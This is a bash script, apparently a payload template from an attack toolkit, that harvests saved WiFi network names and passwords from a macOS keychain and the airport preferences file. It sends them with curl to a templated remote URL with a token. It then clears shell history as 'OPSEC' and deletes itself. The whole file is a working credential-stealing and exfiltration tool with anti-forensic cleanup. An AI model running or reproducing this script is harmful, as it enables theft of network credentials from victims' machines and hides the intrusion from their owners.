#!/bin/bash
# macos_exfil.sh — macOS WiFi Credential Extraction
POST_URL="{{POST_URL}}"
TOKEN="{{TOKEN}}"

data=""

# Extract current WiFi SSID
current_ssid=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null | grep " SSID" | sed 's/.*: //')

# Get current connected network password
if [ -n "$current_ssid" ]; then
    current_pass=$(security find-generic-password -D "AirPort network password" -s "$current_ssid" -w 2>/dev/null)
    if [ -n "$current_pass" ]; then
        data+="Current Network: $current_ssid"$'\n'"Password: $current_pass"$'\n\n'
    fi
fi

# Get list of known networks from keychain
# This uses a workaround to enumerate saved WiFi passwords
while IFS= read -r network; do
    if [ -n "$network" ]; then
        password=$(security find-generic-password -D "AirPort network password" -s "$network" -w 2>/dev/null)
        if [ -n "$password" ]; then
            data+="SSID: $network"$'\n'"Password: $password"$'\n\n'
        fi
    fi
done < <(security dump-keychain 2>/dev/null | grep "0x00000007" | sed -n '/airport/{n;p}' | grep -oP '(?<=")[^"]+' | sort -u)

# Alternative method: Try common network names from /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
if [ -f /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist ]; then
    known_networks=$(plutil -p /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist 2>/dev/null | grep "SSIDString" | sed 's/.*= //' | tr -d '"' | sort -u)
    while IFS= read -r ssid; do
        if [ -n "$ssid" ]; then
            # Check if we already have this password
            if ! echo "$data" | grep -q "SSID: $ssid"; then
                password=$(security find-generic-password -D "AirPort network password" -s "$ssid" -w 2>/dev/null)
                if [ -n "$password" ]; then
                    data+="SSID: $ssid"$'\n'"Password: $password"$'\n\n'
                fi
            fi
        fi
    done <<< "$known_networks"
fi

# Exfiltrate if data found (with retry logic)
if [ -n "$data" ]; then
    for i in {1..3}; do
        if echo -e "$data" | curl -X POST \
            -H "X-Token: $TOKEN" \
            --data-binary @- \
            "$POST_URL" \
            -s -o /dev/null --max-time 10; then
            break
        fi
        sleep 2
    done
fi

# OPSEC: Clear shell history
history -c 2>/dev/null
[ -f ~/.bash_history ] && > ~/.bash_history 2>/dev/null

# Self-destruct: delete this script
rm -- "$0" 2>/dev/null
